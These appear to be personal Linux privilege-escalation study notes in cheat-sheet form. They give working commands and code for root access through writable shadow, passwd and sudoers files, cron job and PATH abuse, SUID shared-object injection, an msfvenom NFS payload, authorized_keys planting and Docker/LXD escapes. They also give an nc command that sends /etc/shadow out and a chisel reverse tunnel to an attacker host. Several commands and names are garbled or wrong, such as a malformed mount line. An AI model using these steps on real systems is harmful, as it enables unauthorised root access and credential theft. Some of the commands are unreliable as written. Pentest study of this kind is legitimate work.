# Linux Privesc

# Week File Permission:

We are going to discuss three files in this.

- `/etc/passwd`  —> store usernames
- `/etc/shadow` —> store password hashes
- `/etc/sudoer` —> If we have **write access** to this file, we can give `sudo` permission to anyone.

## **Shadow File:**

1. **Read** permission on the **shadow** file, crack the hash using John.
    
    cmd: `john hash.txt —wordlist=<path-of-wordlist>`
    
2. **Read and write** on the **Shadow** file,
    
    transfer the file into your machine using `nc`—> `nc -nvlp 4444 < /etc/shaow`
    
    connect with **`nc`** in your machine —> `nc <target-IP> 4444 > shadow`
    
    Replace the hash with another, create a hash with `openssl` using cmd —> `openssl passwd -6 hello`
    

## Passwd File:

1. Read and write both permissions, just delete the **`x`** 
2. If the above step does not work, then **add the hash after the root.**
3. Add a new user with the same permissions as root.

## Sudoers File:

if you have write permission to this file, just add your user after the root and copy the same permissions as root. after this, you can run any cmd as root using sudo.

# Sudo Misconfiguration

List the programs which sudo allows your user to run: `sudo -l`

**`GTFObins`**: [https://gtfobins.github.io/](https://gtfobins.github.io/)

# Cron Jobs Exploitation

## File Permissions:

1. **`cat /etc/crontab`**   
2. **If you do not have read permission on the `/etc/crontab`** file, then analyse the **modification time.**
3. If you also do not have **read permission, and the modification time** is also not visible, use the tool **`pxpy`** (download from Github) to analyse the running process 

## PATH Environment Variable:

In this, if a **`cron job`** file’s full path is not given, then we can use the path variable and create a file with the same name on the path before the actual path.

Another way to get the root shell: 

In the cronjob file, we can copy **`/bin/bash`** and then give the copied file SUID permission.

```php
!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

## Wildcards:

# SUID / SGID Executables

## Known Exploits:

1. `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

## Shared Object Injection:

Example:

1. Consider we have a file `/usr/local/bin/suid-so` 
2. `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"` Use this command to check the program at runtime what library file is being called.
3. Here, we have a C code to get Shell:
    
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    
    static void inject() __attribute__((constructor));
    
    void inject() {
    	setuid(0);
    	system("/bin/bash -p");
    }
    
    ```
    
4. Use this command to compile the above code: `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
5. Just execute the file `/usr/local/bin/suid-so`

## Environment Variables:

`PATH=/home/user:$PATH`. Like this, you can update the value of the Environment Variable.

We almost did the same thing; the only change is that we injected the user-controlled path in the PATH variable. 

# **Linux Capabilities**

It is somewhat similar to SUID. But this is more secure than it.

The command to find the capability-enabled file: **`getcap -r / 2>/dev/null`** 

# **Network File Share (NFS) Misconfigurations**

In simple terms, it is a network file-sharing protocol used to share files from one system to another within a network.

1. `showmount -e <IP>`  ←- check the export list 
2. Check the NFS share configuration on the Debian VM:
    
    `cat /etc/exports`
    
3. If you have share folder like /tmp, do bellow steps in your system:
    
    Run all commands as root on your system.
    
    `mkdir /tmp/nfsmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`
    
    Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):
    
    `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
    
    Still using Kali's root user, make the file executable and set the SUID permission:
    
    `chmod +xs /tmp/nfs/shell.elf`
    
4. Now run the file  `/tmp/shell.elf` on the victim machine.

# **SSH Keys, History Files and Config Files**

1. Always run `ls -la` before doing anything and check the history files.
2. Check config files.
3. If the SSH port is open, and you want a stable **SSH** shell, and you have an **NC** shell:
    1. **`ssh-keygen -t rsa` creates SSH public and private keys in both.**
    2. Create an **`authorized_keys`** file in the **`.ssh`**directory on the target system and paste your public key into it.
    3. Now you can connect with SSH without a password.
4. If you have access to an SSH private key.
    1. Just create a file called **`id_rsa`** in your system.
    2. Give permission **`chmod 600 id_rsa`**
    3. Now connect with SSH: **`ssh -i id_rsa user@<IP>`**

# Kernel Exploits

1. Check Linux version: **`uname -r`**
2. Search for available exploits on Google.
3. Download the exploit into your system and transfer it via NC to the target system.
4. Execute.

# **Process Hijacking**

1. Check the processes running on the system through **`ps aux`**
2. Find any suspicious process running with root privileges.
3. Use that process to escalate privileges.

# **Port Forwarding**

- SOCAT is used for port forwarding without Tunnelling.
1. First, check the internal ports using **`netstat -plant`**
2. Tool used for Port Forwarding with tunnelling - **`chisel`**
3. Download the tool to your system, then transfer it to the target system using the Python server.
4. Always download external tools to the `/tmp` directory.
5. How to use a chisel:
    1. First, run chisel in the attacker system as a server —> **`./chisel server  --reverse --port 9001`** 
    2. Now, On Target system —> **`./chisel client <ATTACKER-IP>:9001 R:3333:127.0.0.1:6666`**
    3. **`3333`** is the port of the attacker where the client will connect. **`6666`** is the port that is forwarding. 
    4. You can now access it through a browser at [**`http://127.0.0.1:3333`**](http://127.0.0.1:3333/).

# **User Groups**

- Check which group part you are by using **`id` cmd.**
1. If you are part of the Docker Group, follow the steps to escalate privilege:
    1. Check what images you have using **`docker image ls`**
    2. To use the image shell, use **`docker run -it <image_name> sh`**
    3. Mount the file system to the container using **`docker run -v /:/mnt -it <image_name> sh`**
    4. All files from the shell's file system will appear in the **`/mnt`** folder of the container.
2. If you are part of the LXD Group, follow the steps to escalate privilege:
    1. To check what images you have, use **`lxc image list`**
    2. If you don’t have any image, then you can download the **`LXD Alpine image`** from GitHub. And then transfer it to the victim machine.
    3. Now import this image to the LXD group: **`lxc image import ./alpine.tar.gz --alias alpineimg`**
    4. Check using **`lxc image list`**
    5. Now run the image and create the LXD container:
        
        **`lxc init alpineimg alpinecon -c security.privileged=true`**
        
    6. Mount the file system in the container: 
        
        **`lxc config device add alpinecon mydevice disk source=/ path=/mnt recursive=true`**
        
    7. **`lxc start alpinecon`**
    8. **`lxc exec alpinecon /bin/sh`**